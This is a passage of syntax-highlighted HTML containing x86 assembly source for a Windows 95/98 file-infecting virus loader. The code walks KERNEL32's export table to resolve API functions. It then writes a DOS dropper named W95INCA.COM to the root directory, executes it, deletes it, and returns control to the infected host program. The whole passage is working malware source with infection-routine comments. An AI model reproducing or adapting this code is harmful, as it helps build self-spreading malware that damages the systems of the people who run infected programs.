         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FAdress</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc5">GetFunctionAdress</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsd</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndTable</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MyGetProcAdress</span><span class="sc0">                  </span><span class="sc1">;get RVA of all functionz we</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc0">                         </span><span class="sc1">;need</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetFunctionAdress</span><span class="sc0">
  </span><span class="sc5">EndTable</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">010b</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;create W95INCA.COM in root</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;dir</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc4">+</span><span class="sc2">40000000h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PEName</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_CreateFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">nWrite</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc5">PEDOSSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoaderSize</span><span class="sc0">        </span><span class="sc1">;write the DOS dropper in it</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;close the file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PEName</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;f0rk DOS process</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_WinExec</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">                             </span><span class="sc1">;have 3 seconds to run</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_Sleep</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PEName</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;delete the dropper</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">_DeleteFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">ReturnHost</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                    </span><span class="sc1">;set base</span><span class="sc0">
  </span><span class="sc5">LoadBase</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">OldIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;add host entry_point</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">AnaliseKernel32</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">                   </span><span class="sc1">;base of KERNEL32 in win95/98</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">gmh</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
                                               </span><span class="sc1">;string is 17 bytes long</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">szSearch</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
                                               </span><span class="sc1">;and setup pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">strSearch</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchET</span><span class="sc0">                         </span><span class="sc1">;search export tabel for it</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">a_error</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pGetModuleHandle</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">gpa</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
                                               </span><span class="sc1">;string is 15 bytes long</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">szSearch</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
                                               </span><span class="sc1">;and setup pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">strSearch</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchET</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">a_error</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pGetProcAdress</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pGetModuleHandle</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;get KERNEL32 module</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pKernel32Adress</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">a_error</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">MyGetProcAdress</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pKernel32Adress</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">pGetProcAdress</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;call GetProcAddress to get</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GPAError</span><span class="sc0">                           </span><span class="sc1">;all RVA we need</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                                 </span><span class="sc1">;the good'n'old trick again ;)</span><span class="sc0">
  </span><span class="sc5">GPAError</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">SearchET</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;search export table of</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                          </span><span class="sc1">;KERNEL32, searching the</span><span class="sc0">
  </span><span class="sc5">ff</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;the names, then the ordinal</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;and, finally the RVA pointerz</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">strSearch</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">szSearch</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff</span><span class="sc0">
  </span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc5">fuck</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kernel</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">nWrite</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pGetProcAdress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pGetModuleHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pKernel32Adress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">

</span><span class="sc5">gpa</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gmh</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sCreateFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sWriteFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sCloseHandle</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sWinExec</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WinExec'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sDeleteFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sSleep</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NamePtr</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sCreateFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sWriteFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sCloseHandle</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sWinExec</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sDeleteFile</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">sSleep</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

